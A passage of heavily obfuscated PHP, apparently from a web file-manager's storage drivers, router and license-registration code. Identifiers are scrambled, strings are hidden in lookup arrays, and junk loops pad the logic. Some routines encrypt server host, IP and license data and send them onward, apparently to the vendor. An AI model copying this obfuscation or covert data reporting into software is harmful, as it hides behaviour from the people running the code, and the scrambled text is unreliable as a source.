$®‡•¡[33]; $¹ ”¨òî = intval($è•¨¬Òš / $ÍàêêÒæ); $¯ô³İç® = fopen($Ñø¨¥Ó›, $®‡•¡[1303]); if (!$¯ô³İç®) { return $Ë§­§Ø°; } for ($˜¨½ŒÑì = 0; $˜¨½ŒÑì < $ÍàêêÒæ; $˜¨½ŒÑì++) { fseek_64($¯ô³İç®, $¹ ”¨òî * $˜¨½ŒÑì); $Ë§­§Ø° .= fread($¯ô³İç®, $ıÎŸ¼); } fseek_64($¯ô³İç®, $è•¨¬Òš - $ıÎŸ¼); $Ë§­§Ø° .= fread($¯ô³İç®, $ıÎŸ¼); fclose($¯ô³İç®); return md5($Ë§­§Ø°) . $è•¨¬Òš; } public function getContent($´›µ£¬Ç) { $´›µ£¬Ç = $this->iconvSystem($´›µ£¬Ç); return file_get_contents($´›µ£¬Ç); } public function setContent($ÎØƒì¤ü, $ÏµÔ³¤ = '') { $ÎØƒì¤ü = $this->iconvSystem($ÎØƒì¤ü); $ŠÁö«Üç = @file_put_contents($ÎØƒì¤ü, $ÏµÔ³¤, LOCK_EX); clearstatcache(); @chmod($ÎØƒì¤ü, $this->pathAuth); return $ŠÁö«Üç === !1 ? !1 : !0; } public function fileSubstr($˜Úä³ÓÒ, $×Œßüô° = 0, $òŠøàÕ = false) { $«¿ş½„· =& $_SERVER[Á÷ ­Šë]; $˜Úä³ÓÒ = $this->iconvSystem($˜Úä³ÓÒ); if ($òŠøàÕ === !1) { $òŠøàÕ = $this->size($˜Úä³ÓÒ); } if ($òŠøàÕ <= 0) { return $«¿ş½„·[33]; } $îâ…„³ = fopen($˜Úä³ÓÒ, $«¿ş½„·[1303]); if (!$îâ…„³) { return !1; } fseek_64($îâ…„³, $×Œßüô°); $óñ°üô˜ = fread($îâ…„³, $òŠøàÕ); fclose($îâ…„³); return $óñ°üô˜; } public function upload($“÷®Ú²Â, $õ™Î“•¢, $´ÊÆÛÉù = false, $ê˜½ĞµÔ = REPEAT_REPLACE) { if ($´ÊÆÛÉù) { return $this->moveFile($õ™Î“•¢, $“÷®Ú²Â); } return $this->copyFile($õ™Î“•¢, $“÷®Ú²Â); } public function setModifyTime($¹ÇŒ¿ı¹, $¦¸•ƒÇ€ = '') { @touch($¹ÇŒ¿ı¹, intval($¦¸•ƒÇ€)); } public function download($¹Å€¸È®, $ÕŠ—±º˜) { return $this->iconvSystem($¹Å€¸È®); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($…ü˜×¿) { parent::__construct($…ü˜×¿); $this->signatureVersion($_SERVER[Á÷ ­Šë][222]); } public function fileOutLink($™“Ö¾ƒ²) { $îÑõìÍÈ =& $_SERVER[Á÷ ­Šë]; if (substr($™“Ö¾ƒ², 0, 7) == $îÑõìÍÈ[1247]) { $™“Ö¾ƒ² = $îÑõìÍÈ[1248] . substr($™“Ö¾ƒ², 7); } header($îÑõìÍÈ[169] . $™“Ö¾ƒ²); die; } } goto a­·óÊ·’ƒ; dÎ¦˜ØÇÄƒ: class Application { private $defaultModule = "\x69\156\144\x65\x78"; private $defaultController = "\x69\x6e\144\145\x78"; private $defaultAction = "\151\156\x64\x65\170"; function __construct() { } public function setDefault($¯‘Óò¡–) { $ƒãµä =& $_SERVER[Á÷ ­Šë]; $ì‘š»¹¨ =& $_SERVER[š¿ˆÑø]; $Ê·¥”ä³ = explode($ì‘š»¹¨[0], trim($¯‘Óò¡–, $ì‘š»¹¨[0])); $ú À…¨¹ = $ƒãµä[615]; while ($ú À…¨¹ < $ƒãµä[616]) { if ($ú À…¨¹ >= 0) { break; } $ú À…¨¹++; } $this->defaultModule = $Ê·¥”ä³[0] ? $Ê·¥”ä³[0] : $this->defaultModule; $this->defaultController = $Ê·¥”ä³[1] ? $Ê·¥”ä³[1] : $this->defaultController; $üó‰îØ­ = $ƒãµä[617]; $this->defaultAction = $Ê·¥”ä³[2] ? $Ê·¥”ä³[2] : $this->defaultAction; $«¬ÕğÊÌ = $ƒãµä[618]; if (strlen($«¬ÕğÊÌ) < $ƒãµä[616]) { return; } $this->gyrjd3bdb145($ì‘š»¹¨[1], array($this, $ì‘š»¹¨[2])); } public function appRun($‡£—ÕÕ) { $ù¸ËäÚô =& $_SERVER[Á÷ ­Šë]; $×´ı½½Ô =& $_SERVER[š¿ˆÑø]; $á—¿Ø“É = explode($×´ı½½Ô[0], $‡£—ÕÕ); $ÕÍ¿â­ó = strtolower($á—¿Ø“É[0]); $¼Éçô£ = $×´ı½½Ô[3]; if ($ÕÍ¿â­ó == $×´ı½½Ô[4]) { $¼Éçô£ = $×´ı½½Ô[5]; $á—¿Ø“É[0] = $×´ı½½Ô[6]; $á—¿Ø“É[1] = $á—¿Ø“É[1] . $×´ı½½Ô[7]; $‡£—ÕÕ = join($×´ı½½Ô[0], $á—¿Ø“É); $‡£—ÕÕ = trim($‡£—ÕÕ, $×´ı½½Ô[0]); } call_user_func(array($×´ı½½Ô[8], $×´ı½½Ô[9]), $¼Éçô£ . $×´ı½½Ô[10], $‡£—ÕÕ); ActionCall($‡£—ÕÕ); $şÒ‡äÚ = $ù¸ËäÚô[619]; if (strlen($şÒ‡äÚ) < $ù¸ËäÚô[63]) { die; } call_user_func(array($×´ı½½Ô[8], $×´ı½½Ô[9]), $¼Éçô£ . $×´ı½½Ô[11], $‡£—ÕÕ); $ºÛä¤ì§ = $ù¸ËäÚô[620]; if (strlen($ºÛä¤ì§) < $ù¸ËäÚô[616]) { die; } } private function autorun() { $ÖŞ’¾ˆ =& $_SERVER[Á÷ ­Šë]; $äøşêçÛ =& $_SERVER[š¿ˆÑø]; global $config; $Ğî¸ áò = $ÖŞ’¾ˆ[621]; if (strlen($Ğî¸ áò) < $ÖŞ’¾ˆ[616]) { die; } if (count($config[$äøşêçÛ[12]]) == 0) { return; } foreach ($config[$äøşêçÛ[12]] as $¿«º¡ŞÃ => $ñÅ§Á†¨) { $this->appRun($ñÅ§Á†¨); } } private function hqbl9d911b33() { $„ä±×ú =& $_SERVER[Á÷ ­Šë]; $ÕõğßÌê =& $_SERVER[š¿ˆÑø]; $¥Ì Ò‚Í = $ÕõğßÌê[4]; $áÎÍ“ì‡ = $GLOBALS[$ÕõğßÌê[13]][$ÕõğßÌê[14]][0]; $Ñ€à ƒê = $„ä±×ú[622]; if (!$Ñ€à ƒê) { return; } if (!$áÎÍ“ì‡ || strlen($áÎÍ“ì‡) <= strlen($¥Ì Ò‚Í)) { return; } if (strtolower(substr($áÎÍ“ì‡, -strlen($¥Ì Ò‚Í))) != $¥Ì Ò‚Í) { return; } $òİÑ—† = substr($áÎÍ“ì‡, 0, -strlen($¥Ì Ò‚Í)); $Ñ„ÑÉ¹ë = $„ä±×ú[623]; while ($Ñ„ÑÉ¹ë < $„ä±×ú[616]) { if ($Ñ„ÑÉ¹ë >= 0) { break; } $Ñ„ÑÉ¹ë++; } $¦ø´Ìí = array($ÕõğßÌê[4], $òİÑ—†); $±£†®È¤ = $„ä±×ú[624]; $º©éÄ˜µ = array_slice($GLOBALS[$ÕõğßÌê[13]][$ÕõğßÌê[14]], 1); $GLOBALS[$ÕõğßÌê[13]][$ÕõğßÌê[14]] = array_merge($¦ø´Ìí, $º©éÄ˜µ); $GLOBALS[$ÕõğßÌê[13]][$ÕõğßÌê[15]] = implode($ÕõğßÌê[0], $GLOBALS[$ÕõğßÌê[13]][$ÕõğßÌê[14]]); } private function devpbf39cfb8() { $Ö–Â€Ö· =& $_SERVER[Á÷ ­Šë]; $¥‹¿‘Ğ÷ =& $_SERVER[š¿ˆÑø]; if ($GLOBALS[$¥‹¿‘Ğ÷[13]][$¥‹¿‘Ğ÷[15]] != $¥‹¿‘Ğ÷[6]) { return; } $ïöÓùÉ§ = $_SERVER[$¥‹¿‘Ğ÷[16]]; $ÚØ‘î´¼ = $¥‹¿‘Ğ÷[17]; $ØşÃ×„ª = $Ö–Â€Ö·[625]; while ($ØşÃ×„ª < $Ö–Â€Ö·[614]) { if ($ØşÃ×„ª >= 0) { break; } $ØşÃ×„ª++; } if (!strstr($ïöÓùÉ§, $ÚØ‘î´¼)) { return; } $èáâ…¿ = strrpos($ïöÓùÉ§, $ÚØ‘î´¼); $ú·Ñì° = $Ö–Â€Ö·[626]; if (!$ú·Ñì°) { die; } $Ê””äö® = substr($ïöÓùÉ§, $èáâ…¿ + strlen($ÚØ‘î´¼)); $Óİƒ„ª“ = $Ö–Â€Ö·[627]; preg_match_all($¥‹¿‘Ğ÷[18], $Ê””äö®, $Ö«Î†è¿); $Ê””äö® = trim($Ö«Î†è¿[0][0], $¥‹¿‘Ğ÷[19]); $è•Ø±Ôó = $Ö–Â€Ö·[628]; if (strlen($è•Ø±Ôó) < $Ö–Â€Ö·[63]) { return; } $GLOBALS[$¥‹¿‘Ğ÷[13]][$¥‹¿‘Ğ÷[14]] = explode($¥‹¿‘Ğ÷[19], $Ê””äö®); $“ú¶ŠÚ = $Ö–Â€Ö·[629]; $GLOBALS[$¥‹¿‘Ğ÷[13]][$¥‹¿‘Ğ÷[15]] = implode($¥‹¿‘Ğ÷[0], $GLOBALS[$¥‹¿‘Ğ÷[13]][$¥‹¿‘Ğ÷[14]]); } public function run() { $Ú­ ¸ª– =& $_SERVER[Á÷ ­Šë]; $¥ûÏÎÁÑ =& $_SERVER[š¿ˆÑø]; $this->devpbf39cfb8(); $this->hqbl9d911b33(); $« ™Õ¡ä = $GLOBALS[$¥ûÏÎÁÑ[13]][$¥ûÏÎÁÑ[14]]; $¶¿†Òíœ = $GLOBALS[$¥ûÏÎÁÑ[13]][$¥ûÏÎÁÑ[15]]; define($¥ûÏÎÁÑ[20], isset($« ™Õ¡ä[0]) && $« ™Õ¡ä[0] ? $« ™Õ¡ä[0] : $this->defaultModule); define($¥ûÏÎÁÑ[21], isset($« ™Õ¡ä[1]) && $« ™Õ¡ä[0] ? $« ™Õ¡ä[1] : $this->defaultController); define($¥ûÏÎÁÑ[22], isset($« ™Õ¡ä[2]) && $« ™Õ¡ä[0] ? $« ™Õ¡ä[2] : $this->defaultAction); $åÏ¬¬¤ = $Ú­ ¸ª–[630]; if (strlen($åÏ¬¬¤) < $Ú­ ¸ª–[616]) { return; } define($¥ûÏÎÁÑ[23], MOD . $¥ûÏÎÁÑ[0] . ST . $¥ûÏÎÁÑ[0] . ACT); $‘¶ˆú¤Ì = $Ú­ ¸ª–[631]; while ($‘¶ˆú¤Ì < $Ú­ ¸ª–[614]) { if ($‘¶ˆú¤Ì >= 0) { break; } $‘¶ˆú¤Ì++; } $_SERVER[$¥ûÏÎÁÑ[24]] = strtolower(ACTION); $¥ı™æ‰ê = $Ú­ ¸ª–[632]; while ($¥ı™æ‰ê < $Ú­ ¸ª–[63]) { if ($¥ı™æ‰ê >= 0) { break; } $¥ı™æ‰ê++; } $this->autorun(); $Ù¸†¦‚» = $Ú­ ¸ª–[633]; if (count($« ™Õ¡ä) >= 3) { $this->appRun($¶¿†Òíœ); } else { $this->appRun(ACTION); } } private $cpvt93ae85c3 = array(); private $mwuv5f67d042 = ''; public function guhkf129023a() { $ó¿¤ÎÏä =& $_SERVER[Á÷ ­Šë]; $êÄÙõû =& $_SERVER[š¿ˆÑø]; $this->cgtq8e1f5632(); $this->ydwh918d8e11(); $this->upde4a07955f(); $this->hgqofba24b6a(); $this->otewd4b43632(); $this->kjwzebe86462(); $¬Šëıš§ = $ó¿¤ÎÏä[634]; while (strlen($¬Šëıš§) < $ó¿¤ÎÏä[63]) { if (!$¬Šëıš§) { break; } $¬Šëıš§++; } $this->zefw714683cb(); $¯ÁÁÙºÔ = $ó¿¤ÎÏä[635]; if (!$¯ÁÁÙºÔ) { die; } $this->gyrjd3bdb145($êÄÙõû[25], array($this, $êÄÙõû[26])); $ù½»ï‰“ = $ó¿¤ÎÏä[636]; $this->gyrjd3bdb145($êÄÙõû[27], array($this, $êÄÙõû[28])); $this->gyrjd3bdb145($êÄÙõû[29], array($this, $êÄÙõû[30])); $·°÷ÇÙ = $ó¿¤ÎÏä[637]; while (strlen($·°÷ÇÙ) < $ó¿¤ÎÏä[63]) { if (!$·°÷ÇÙ) { break; } $·°÷ÇÙ++; } $this->gyrjd3bdb145($êÄÙõû[31], array($this, $êÄÙõû[32])); } public function gpec1f69b920($Ï——±Î¸) { $é½óÊî— =& $_SERVER[Á÷ ­Šë]; $ÕäãÃ¥‘ =& $_SERVER[š¿ˆÑø]; $›œ­ªÚô = Model($ÕäãÃ¥‘[33])->get(); $–ŠèØÉ = array($ÕäãÃ¥‘[34], $ÕäãÃ¥‘[35], $ÕäãÃ¥‘[36], $ÕäãÃ¥‘[37], $ÕäãÃ¥‘[38], $ÕäãÃ¥‘[39], $ÕäãÃ¥‘[40], $ÕäãÃ¥‘[41], $ÕäãÃ¥‘[42], $ÕäãÃ¥‘[43], $ÕäãÃ¥‘[44], $ÕäãÃ¥‘[45], $ÕäãÃ¥‘[46], $ÕäãÃ¥‘[47], $ÕäãÃ¥‘[48], $ÕäãÃ¥‘[49], $ÕäãÃ¥‘[50], $ÕäãÃ¥‘[51], $ÕäãÃ¥‘[52], $ÕäãÃ¥‘[53], $ÕäãÃ¥‘[54], $ÕäãÃ¥‘[55], $ÕäãÃ¥‘[56], $ÕäãÃ¥‘[57], $ÕäãÃ¥‘[58], $ÕäãÃ¥‘[59], $ÕäãÃ¥‘[60], $ÕäãÃ¥‘[61], $ÕäãÃ¥‘[62], $ÕäãÃ¥‘[63], $ÕäãÃ¥‘[64], $ÕäãÃ¥‘[65], $ÕäãÃ¥‘[66], $ÕäãÃ¥‘[67], $ÕäãÃ¥‘[68], $ÕäãÃ¥‘[69], $ÕäãÃ¥‘[70], $ÕäãÃ¥‘[71], $ÕäãÃ¥‘[72], $ÕäãÃ¥‘[73], $ÕäãÃ¥‘[74], $ÕäãÃ¥‘[75], $ÕäãÃ¥‘[76], $ÕäãÃ¥‘[77], $ÕäãÃ¥‘[78], $ÕäãÃ¥‘[79], $ÕäãÃ¥‘[80]); $ı¡È¸„İ = $é½óÊî—[638]; if (strlen($ı¡È¸„İ) < $é½óÊî—[639]) { die; } foreach ($–ŠèØÉ as $‹†ÓæĞó) { $¨èŠé£ = $GLOBALS[$ÕäãÃ¥‘[81]][$ÕäãÃ¥‘[82]][$‹†ÓæĞó]; if (isset($›œ­ªÚô[$‹†ÓæĞó])) { $¨èŠé£ = $›œ­ªÚô[$‹†ÓæĞó]; } $Ï——±Î¸[$ÕäãÃ¥‘[83]][$ÕäãÃ¥‘[84]][$‹†ÓæĞó] = $¨èŠé£; } $´¯ùáîê = $Ï——±Î¸[$ÕäãÃ¥‘[83]][$ÕäãÃ¥‘[84]][$ÕäãÃ¥‘[46]]; $‚õ‘ªÉå = $é½óÊî—[640]; while ($‚õ‘ªÉå < $é½óÊî—[616]) { if ($‚õ‘ªÉå >= 0) { break; } $‚õ‘ªÉå++; } unset($Ï——±Î¸[$ÕäãÃ¥‘[83]][$ÕäãÃ¥‘[85]][$ÕäãÃ¥‘[86]]); unset($Ï——±Î¸[$ÕäãÃ¥‘[83]][$ÕäãÃ¥‘[85]][$ÕäãÃ¥‘[87]]); $Ê—ÖŒŠá = $é½óÊî—[641]; if (!$Ê—ÖŒŠá) { return; } unset($Ï——±Î¸[$ÕäãÃ¥‘[83]][$ÕäãÃ¥‘[84]][$ÕäãÃ¥‘[46]]); unset($Ï——±Î¸[$ÕäãÃ¥‘[83]][$ÕäãÃ¥‘[84]][$ÕäãÃ¥‘[88]]); $ˆÕÑŠç¿ = $é½óÊî—[642]; if (strlen($ˆÕÑŠç¿) < $é½óÊî—[639]) { return; } $Ï——±Î¸[$ÕäãÃ¥‘[83]][$ÕäãÃ¥‘[84]][$ÕäãÃ¥‘[89]] = array($ÕäãÃ¥‘[90] => (int) $´¯ùáîê[$ÕäãÃ¥‘[91]], $ÕäãÃ¥‘[92] => (int) _get($´¯ùáîê, $ÕäãÃ¥‘[93], 0)); $Ï——±Î¸[$ÕäãÃ¥‘[94]][$ÕäãÃ¥‘[95]] = Action($ÕäãÃ¥‘[96])->accessToken(); $õİ‰é• = $é½óÊî—[643]; if (!$õİ‰é•) { die; } $Ï——±Î¸[$ÕäãÃ¥‘[94]][$ÕäãÃ¥‘[97]] = md5($_SERVER[$ÕäãÃ¥‘[98]] . $›œ­ªÚô[$ÕäãÃ¥‘[99]]); $Ï——±Î¸[$ÕäãÃ¥‘[94]][$ÕäãÃ¥‘[100]] = base64_encode(serverInfo()); $ò¦ıÊ­À = $é½óÊî—[644]; $Ï——±Î¸[$ÕäãÃ¥‘[94]][$ÕäãÃ¥‘[101]] = $this->mwuv5f67d042; if ($›œ­ªÚô[$ÕäãÃ¥‘[101]] != $ÕäãÃ¥‘[102]) { $Ï——±Î¸[$ÕäãÃ¥‘[94]][$ÕäãÃ¥‘[103]] = $›œ­ªÚô[$ÕäãÃ¥‘[103]]; $Ï——±Î¸[$ÕäãÃ¥‘[94]][$ÕäãÃ¥‘[104]] = $›œ­ªÚô[$ÕäãÃ¥‘[104]]; $ÛÁ¬¤õñ = rand_string(10) . $this->mwuv5f67d042 . rand_string(5); $Ï——±Î¸[$ÕäãÃ¥‘[83]][$ÕäãÃ¥‘[105]][$ÕäãÃ¥‘[106]] = $this->gcbk66816f0f($ÛÁ¬¤õñ, $Ï——±Î¸[$ÕäãÃ¥‘[94]][$ÕäãÃ¥‘[97]]); } if ($this->mwuv5f67d042 == $ÕäãÃ¥‘[102]) { $Ï——±Î¸[$ÕäãÃ¥‘[83]][$ÕäãÃ¥‘[84]][$ÕäãÃ¥‘[89]][$ÕäãÃ¥‘[93]] = 0; } $Ï——±Î¸[$ÕäãÃ¥‘[94]][$ÕäãÃ¥‘[107]] = _get($this->cpvt93ae85c3, $ÕäãÃ¥‘[108], $ÕäãÃ¥‘[6]); $Ï——±Î¸[$ÕäãÃ¥‘[94]][$ÕäãÃ¥‘[109]] = _get($this->cpvt93ae85c3, $ÕäãÃ¥‘[110], $ÕäãÃ¥‘[6]); if (_get($GLOBALS, $ÕäãÃ¥‘[111]) && $this->config[$ÕäãÃ¥‘[112]]) { $Ï——±Î¸[$ÕäãÃ¥‘[94]][$ÕäãÃ¥‘[113]] = WEB_ROOT; } return $Ï——±Î¸; } private function kjwzebe86462() { $•Ï¦Ãµ =& $_SERVER[Á÷ ­Šë]; $Âˆà”Ñ‘ =& $_SERVER[š¿ˆÑø]; if ($_SERVER[$Âˆà”Ñ‘[24]] == $Âˆà”Ñ‘[114]) { $†¦£•Ş = array($Âˆà”Ñ‘[101] => $this->mwuv5f67d042, $Âˆà”Ñ‘[115] => $this->lrqad82104aa(), $Âˆà”Ñ‘[116] => Model($Âˆà”Ñ‘[117])->count()); if ($this->mwuv5f67d042 != $Âˆà”Ñ‘[102]) { $™­ÌºÍü = _get($this->cpvt93ae85c3, $Âˆà”Ñ‘[118]); if ($™­ÌºÍü) { $†¦£•Ş[$Âˆà”Ñ‘[119]] = $™­ÌºÍü; $†¦£•Ş[$Âˆà”Ñ‘[120]] = strtotime(_get($this->cpvt93ae85c3, $Âˆà”Ñ‘[121])); $†¦£•Ş[$Âˆà”Ñ‘[122]] = _get($this->cpvt93ae85c3, $Âˆà”Ñ‘[110]); } $™Éùë¤ = Model($Âˆà”Ñ‘[33])->get($Âˆà”Ñ‘[123], $Âˆà”Ñ‘[6], !0); if (is_string($™Éùë¤) && substr($™Éùë¤, 0, 1) == $Âˆà”Ñ‘[124]) { $™Éùë¤ = json_decode_force($™Éùë¤); } if (is_array($™Éùë¤) && $™Éùë¤[$Âˆà”Ñ‘[125]] && strstr($™Éùë¤[$Âˆà”Ñ‘[125]], $Âˆà”Ñ‘[126])) { $”£¯Ê† = explode($Âˆà”Ñ‘[126], $™Éùë¤[$Âˆà”Ñ‘[125]]); $†¦£•Ş[$Âˆà”Ñ‘[127]] = $”£¯Ê†[0]; } } $†¦£•Ş = $this->jcpm905a115d(json_encode($†¦£•Ş), md5($Âˆà”Ñ‘[128])); $Ãóöß½Ã = array($Âˆà”Ñ‘[129] => $†¦£•Ş); $†Æìô•¾ = $•Ï¦Ãµ[645]; if (strlen($†Æìô•¾) < $•Ï¦Ãµ[616]) { die; } call_user_func(array($Âˆà”Ñ‘[130], $Âˆà”Ñ‘[131]), $Ãóöß½Ã); } if ($this->mwuv5f67d042 == $Âˆà”Ñ‘[102]) { return; } $ôš×ğ‘ò = array($Âˆà”Ñ‘[132], $Âˆà”Ñ‘[133], $Âˆà”Ñ‘[134], $Âˆà”Ñ‘[135], $Âˆà”Ñ‘[136], $Âˆà”Ñ‘[137]); $Ÿü“˜ı– = Model($Âˆà”Ñ‘[33])->get(); $Ãóöß½Ã = array($Âˆà”Ñ‘[138] => $Ÿü“˜ı–[$Âˆà”Ñ‘[34]], $Âˆà”Ñ‘[139] => $Ÿü“˜ı–[$Âˆà”Ñ‘[35]], $Âˆà”Ñ‘[140] => $Âˆà”Ñ‘[6]); $„…Àì– = $•Ï¦Ãµ[646]; if (strlen($„…Àì–) < $•Ï¦Ãµ[614]) { die; } foreach ($ôš×ğ‘ò as $ğì„Š†Â) { if (!isset($Ÿü“˜ı–[$ğì„Š†Â]) || !$Ÿü“˜ı–[$ğì„Š†Â]) { continue; } $Ãóöß½Ã[$ğì„Š†Â] = $Ÿü“˜ı–[$ğì„Š†Â]; $ª‚”±ÅŒ = $•Ï¦Ãµ[647]; if (strlen($ª‚”±ÅŒ) < $•Ï¦Ãµ[616]) { return; } } call_user_func(array($Âˆà”Ñ‘[130], $Âˆà”Ñ‘[131]), $Ãóöß½Ã); $‚Å€ÚÖò = $•Ï¦Ãµ[648]; if (strlen($‚Å€ÚÖò) < $•Ï¦Ãµ[614]) { die; } } private function hgqofba24b6a() { $È²†ê¥¾ =& $_SERVER[Á÷ ­Šë]; $…—ÖĞÌí =& $_SERVER[š¿ˆÑø]; if ($_SERVER[$…—ÖĞÌí[24]] != $…—ÖĞÌí[141]) { return; } if (!_get($GLOBALS, $…—ÖĞÌí[111])) { die; } $¢¨öŞ¬ì = $GLOBALS[$…—ÖĞÌí[13]]; if (isset($¢¨öŞ¬ì[$…—ÖĞÌí[142]])) { $this->funt0f99aa61(); die; } if (!isset($¢¨öŞ¬ì[$…—ÖĞÌí[143]]) || strlen($¢¨öŞ¬ì[$…—ÖĞÌí[143]]) != 16) { show_json($…—ÖĞÌí[144] . $¢¨öŞ¬ì[$…—ÖĞÌí[143]], !1); } $Ì“Ï È = Model($…—ÖĞÌí[33])->get($…—ÖĞÌí[99]); $ğ‰½µš˜ = md5($_SERVER[$…—ÖĞÌí[98]] . $Ì“Ï È); $­‘œš‘¥ = $È²†ê¥¾[649]; while ($­‘œš‘¥ < $È²†ê¥¾[616]) { if ($­‘œš‘¥ >= 0) { break; } $­‘œš‘¥++; } $¸«½Ò¢Ù = array($…—ÖĞÌí[143] => $¢¨öŞ¬ì[$…—ÖĞÌí[143]], $…—ÖĞÌí[145] => rand_string(16), $…—ÖĞÌí[146] => $…—ÖĞÌí[128], $…—ÖĞÌí[147] => $…—ÖĞÌí[148], $…—ÖĞÌí[149] => $_SERVER[$…—ÖĞÌí[150]], $…—ÖĞÌí[151] => $_SERVER[$…—ÖĞÌí[152]], $…—ÖĞÌí[153] => $_SERVER[$…—ÖĞÌí[154]], $…—ÖĞÌí[97] => $ğ‰½µš˜, $…—ÖĞÌí[155] => Model($…—ÖĞÌí[33])->get($…—ÖĞÌí[123])); if ($¢¨öŞ¬ì[$…—ÖĞÌí[156]] == $…—ÖĞÌí[157]) { $¹è¨‹¦ = $this->jcpm905a115d($ğ‰½µš˜, $…—ÖĞÌí[158]); $×Èâáîí = $this->gcbk66816f0f(json_encode($¸«½Ò¢Ù), $ğ‰½µš˜ . $…—ÖĞÌí[159], 3); $×Èâáîí = $×Èâáîí . $…—ÖĞÌí[160] . $_SERVER[$…—ÖĞÌí[150]]; $ïîÌÅÆ = $this->mdqoa34655bc($…—ÖĞÌí[161] . $¹è¨‹¦ . $…—ÖĞÌí[162] . $×Èâáîí, -1); show_json($ïîÌÅÆ, !0); } else { if ($¢¨öŞ¬ì[$…—ÖĞÌí[156]] == $…—ÖĞÌí[163]) { $“ÌÉÕ÷Ê = substr(md5($…—ÖĞÌí[164] . $ğ‰½µš˜), 12, 15) . $…—ÖĞÌí[165]; $×Èâáîí = $this->opyc19f22a91(trim($¢¨öŞ¬ì[$…—ÖĞÌí[166]]), $“ÌÉÕ÷Ê, 2); $Úı³°Ñº = json_decode($×Èâáîí, !0); if (!is_array($Úı³°Ñº) || !is_array($Úı³°Ñº[$…—ÖĞÌí[167]]) || $Úı³°Ñº[$…—ÖĞÌí[143]] != !0) { $ãğƒÊÁº = $…—ÖĞÌí[168]; $¾àğ¤Ù½ = $Úı³°Ñº[$…—ÖĞÌí[167]] ? $…—ÖĞÌí[169] . $Úı³°Ñº[$…—ÖĞÌí[167]] : $ãğƒÊÁº; show_json($¾àğ¤Ù½, !1); } else { $¸«½Ò¢Ù[$…—ÖĞÌí[145]] = $Úı³°Ñº[$…—ÖĞÌí[167]][$…—ÖĞÌí[170]]; } } else { $Úı³°Ñº = $this->mdqoa34655bc($…—ÖĞÌí[171], $¸«½Ò¢Ù, 10); } } if (!is_array($Úı³°Ñº) || !is_array($Úı³°Ñº[$…—ÖĞÌí[167]]) || $Úı³°Ñº[$…—ÖĞÌí[143]] != !0) { $ãğƒÊÁº = LNG($…—ÖĞÌí[172]); $¾àğ¤Ù½ = $Úı³°Ñº[$…—ÖĞÌí[167]] ? $…—ÖĞÌí[169] . $Úı³°Ñº[$…—ÖĞÌí[167]] : $ãğƒÊÁº; show_json($¾àğ¤Ù½, !1); } $à¼ÜÏÂ = $Úı³°Ñº[$…—ÖĞÌí[167]]; $•õšïı˜ = $this->czwh827376f5($à¼ÜÏÂ[$…—ÖĞÌí[173]]); if (!$•õšïı˜ || $•õšïı˜ != $à¼ÜÏÂ[$…—ÖĞÌí[121]]) { $·‰ºáÊŠ = array($…—ÖĞÌí[174] => Model($…—ÖĞÌí[33])->get($…—ÖĞÌí[99]), $…—ÖĞÌí[175] => $_SERVER[$…—ÖĞÌí[98]], $…—ÖĞÌí[176] => this_url(), $…—ÖĞÌí[151] => $_SERVER[$…—ÖĞÌí[152]]); $×Èâáîí = $this->tfpu56035b42(json_encode($·‰ºáÊŠ)); $this->mdqoa34655bc($…—ÖĞÌí[177] . $×Èâáîí); show_json(LNG($…—ÖĞÌí[178]), !0); } $à·–‰úş = array($…—ÖĞÌí[179] => $à¼ÜÏÂ[$…—ÖĞÌí[180]], $…—ÖĞÌí[181] => $à¼ÜÏÂ[$…—ÖĞÌí[182]], $…—ÖĞÌí[183] => rand_string(16), $…—ÖĞÌí[101] => $à¼ÜÏÂ[$…—ÖĞÌí[184]]); if ($¸«½Ò¢Ù[$…—ÖĞÌí[145]]) { $à·–‰úş[$…—ÖĞÌí[183]] = $¸«½Ò¢Ù[$…—ÖĞÌí[145]]; } $¨–©ö±œ = substr(md5($à·–‰úş[$…—ÖĞÌí[181]]), 10, 10); $Û Â”îŸ = $¨–©ö±œ . $à·–‰úş[$…—ÖĞÌí[101]] . $à·–‰úş[$…—ÖĞÌí[183]]; $µüÎô‰û = $È²†ê¥¾[650]; if (!$µüÎô‰û) { die; } $à·–‰úş[$…—ÖĞÌí[103]] = strrev(base64_encode($this->jcpm905a115d($Û Â”îŸ, $…—ÖĞÌí[185]))); $ßŸæ±Ÿ = $È²†ê¥¾[651]; if (strlen($ßŸæ±Ÿ) < $È²†ê¥¾[639]) { die; } $›€¡–Óİ = rand_string(16); $“ƒ³©ş· = $È²†ê¥¾[652]; while ($“ƒ³©ş· < $È²†ê¥¾[639]) { if ($“ƒ³©ş· >= 0) { break; } $“ƒ³©ş·++; } $ß‹ç˜¡¾ = $›€¡–Óİ . $à·–‰úş[$…—ÖĞÌí[101]] . $this->jcpm905a115d(md5($à·–‰úş[$…—ÖĞÌí[179]]), $›€¡–Óİ); $à·–‰úş[$…—ÖĞÌí[104]] = base64_encode(strrev($this->jcpm905a115d($ß‹ç˜¡¾, $…—ÖĞÌí[186]))); if ($à¼ÜÏÂ[$…—ÖĞÌí[187]] && $à¼ÜÏÂ[$…—ÖĞÌí[187]] >= 1) { Model($…—ÖĞÌí[33])->setDeep($…—ÖĞÌí[188], $…—ÖĞÌí[189]); } Model($…—ÖĞÌí[33])->set($à·–‰úş); $æ¢ĞÉî = md5($_SERVER[$…—ÖĞÌí[98]] . strrev($Ì“Ï È) . $à·–‰úş[$…—ÖĞÌí[181]]); $ˆ¥Æ²”ó = $È²†ê¥¾[653]; if (strlen($ˆ¥Æ²”ó) < $È²†ê¥¾[63]) { return; } $·›ä°†º = strrev(substr($æ¢ĞÉî, 10, 16)); $¸ëÓ›³ó = $this->gcbk66816f0f(json_encode($à¼ÜÏÂ), $æ¢ĞÉî); $óìñÚŒú = array_to_keyvalue(Model($…—ÖĞÌí[7])->listData(), $…—ÖĞÌí[190]); $…ÂÔ£ŸÆ = $óìñÚŒú[$…—ÖĞÌí[191]]; $Óá´µÀ¢ = $È²†ê¥¾[654]; if (strlen($Óá´µÀ¢) < $È²†ê¥¾[616]) { return; } $ßãû«†ª = array(); $ñªçêîê = $È²†ê¥¾[655]; if (!$ñªçêîê) { die; } $ßãû«†ª[$·›ä°†º] = $¸ëÓ›³ó; Model($…—ÖĞÌí[7])->update($…ÂÔ£ŸÆ[$…—ÖĞÌí[192]], array($…—ÖĞÌí[193] => $ßãû«†ª)); $this->cpvt93ae85c3 = $à¼ÜÏÂ; $this->mwuv5f67d042 = $à·–‰úş[$…—ÖĞÌí[101]]; $this->licenseRegistSuccess(); Cache::set($…—ÖĞÌí[194] . md5($Ì“Ï È . $…—ÖĞÌí[195]), 